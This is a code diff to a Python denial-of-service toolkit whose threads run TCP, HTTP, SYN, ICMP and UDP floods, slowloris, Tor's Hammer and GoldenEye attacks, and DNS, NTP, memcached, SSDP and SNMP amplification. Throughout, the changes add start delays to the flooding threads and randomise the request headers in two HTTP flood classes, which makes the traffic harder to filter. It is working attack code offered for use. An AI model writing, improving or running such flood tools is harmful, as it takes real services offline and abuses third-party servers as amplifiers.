@@ -38,6 +38,8 @@ def reset():
  flag=-1
  global ier
  ier=0
+ global pointer
+ pointer=0
  global ue
  ue=[]
 def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limiting=True,logs=True,returning=False):
@@ -132,6 +134,7 @@ class tcflood(threading.Thread):
  def run(self):
   global counter
   global stop
+  time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -226,6 +229,7 @@ def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=
 class htflood(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -379,6 +383,7 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
 class prflood(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     z=random.randint(1,20)
@@ -541,6 +546,7 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
   return counter
 class reqpost(threading.Thread):
  def run(self):
+  time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -622,6 +628,7 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True)
 class pham(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     z=random.randint(1,20)
@@ -773,6 +780,7 @@ def torswitch2(new=30,password=None,p=9051,logs=True):
 class xer(threading.Thread):
  def run(self):
   x=pointer
+  time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -848,6 +856,7 @@ class pxer(threading.Thread):
  def run(self):
   global counter
   x=pointer
+  time.sleep(2)
   while (stop!=True):
    try:
     z=random.randint(1,20)
@@ -935,6 +944,7 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
    break
 class slrd(threading.Thread):
  def run(self):
+  time.sleep(2)
   while (stop!=True):
    try: 
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1031,6 +1041,7 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
 class apa(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     apache="5-0"
@@ -1057,6 +1068,7 @@ class apa(threading.Thread):
 class ptc(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   x=pointer
   while (stop!=True):
    try:
@@ -1316,6 +1328,7 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
 class plor(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     z=random.randint(1,20)
@@ -1421,6 +1434,7 @@ class phu(threading.Thread):
   global counter
   global httplist
   global stop
+  time.sleep(2)
   while (stop!=True):
    u=random.choice(paths)
    try:
@@ -1449,6 +1463,7 @@ class hu(threading.Thread):
  def run(self):
   global counter
   global stop
+  time.sleep(2)
   while (stop!=True):
      u=random.choice(paths)
      q=''
@@ -1468,7 +1483,10 @@ class hu(threading.Thread):
      request = urllib2.Request('http://'+target+u)
      request.add_header('User-Agent', random.choice(ua))
      request.add_header('Cache-Control', 'no-cache')
-     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+     request.add_header('Accept',random.choice(a))
+     request.add_header('Accept-Language',random.choice(al))
+     request.add_header('Accept-Encoding',random.choice(ec))
+     request.add_header('Accept-Charset', random.choice(ac))
      request.add_header('Referer', random.choice(referers) +p)
      request.add_header('Keep-Alive', random.randint(100,500))
      request.add_header('Connection', 'keep-alive')
@@ -1598,6 +1616,7 @@ def checksum(msg):
 class sflood(threading.Thread): 
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     dip=target
@@ -1766,6 +1785,7 @@ def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,wi
 class udpsp(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     msg=''
@@ -1833,6 +1853,7 @@ def udpstorm(u,p=80,threads=100,low=64,maxi=64,ampli=1,interval=300,logs=True,re
 class ln(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     if winds=='null':
@@ -1948,6 +1969,7 @@ def land(u,p=80,threads=100,low=64,maxi=64,ampli=15,tcp=False,payloads=False,win
 class dampli(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(dnsl)
@@ -2017,6 +2039,7 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
 class nampli(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(ntpl)
@@ -2083,6 +2106,7 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
 class memampli(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(meml)
@@ -2149,6 +2173,7 @@ def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returnin
 class charampli(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(chargenl)
@@ -2215,6 +2240,7 @@ def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,retur
 class ssampli(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(ssdpl)
@@ -2281,6 +2307,7 @@ def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=F
 class snampli(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     ip=random.choice(snmpl)
@@ -2347,6 +2374,7 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
 class echst(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    data=''
    for x in range(random.randint(1*amp,3*amp)):
@@ -2412,6 +2440,7 @@ def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,retu
 class icmpcl(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    data=''
    for x in range(random.randint(1*amp,3*amp)):
@@ -2478,6 +2507,7 @@ def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,retur
 class icmpst(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    data=''
    for x in range(random.randint(1*amp,3*amp)):
@@ -2545,6 +2575,7 @@ def icmpstorm(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,
 class blnu(threading.Thread):
  def run(self):
   global counter
+  time.sleep(2)
   while (stop!=True):
    try:
     sip=getip()
@@ -2609,6 +2640,7 @@ def blacknurse(u,p=80,ampli=15,low=64,maxi=64,threads=100,payloads=False,interva
 class gldn(threading.Thread):
  def run(self):
   global counter 
+  time.sleep(2)
   while (stop!=True):
    pa=random.choice(paths)
    try:
@@ -2723,6 +2755,7 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
 class medu(threading.Thread):
  def run(self): 
   global counter
+  time.sleep(2)
   try:
    while (stop!=True):
      try:
@@ -2837,6 +2870,7 @@ class dose(threading.Thread):
   global counter 
   u=target
   host=u.split('://')[1].split('/')[0]
+  time.sleep(2)
   while (stop!=True):
    u=target
    try:
@@ -2996,6 +3030,7 @@ class pdose(threading.Thread):
   global counter 
   u=target
   host=u.split('://')[1].split('/')[0]
+  time.sleep(2)
   while (stop!=True):
    pr="http://"+random.choice(httplist)
    proxy={'http':pr,'https':pr}
@@ -3108,6 +3143,7 @@ class atcf(threading.Thread):
  def run(self):
   global counter
   global stop
+  time.sleep(2)
   while (stop!=True):
      u=random.choice(paths)
      q=''
@@ -3134,7 +3170,10 @@ class atcf(threading.Thread):
      else:
       request.add_header('User-Agent', random.choice(ua2))
      request.add_header('Cache-Control', 'no-cache')
-     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+     request.add_header('Accept',random.choice(a))
+     request.add_header('Accept-Language',random.choice(al))
+     request.add_header('Accept-Encoding',random.choice(ec))
+     request.add_header('Accept-Charset', random.choice(ac))
      request.add_header('Referer', random.choice(referers) +p)
      request.add_header('Keep-Alive', random.randint(100,500))
      request.add_header('Connection', 'keep-alive')
